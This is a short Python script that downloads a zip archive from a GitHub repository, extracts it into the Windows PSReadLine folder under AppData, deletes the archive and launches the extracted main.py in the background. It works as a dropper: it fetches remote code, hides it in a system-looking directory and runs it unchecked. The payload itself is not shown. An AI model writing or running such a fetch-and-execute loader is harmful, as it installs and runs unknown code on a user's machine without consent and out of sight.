import subprocess
import zipfile
import os
import shutil
import requests
import time

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine')
os.makedirs(target_path, exist_ok=True)

r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
open(file_path, 'wb').write(r.content)
print(file_path)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

subprocess.Popen(["python", os.path.join(target_path, "skibidi-mainmain", "main.py")])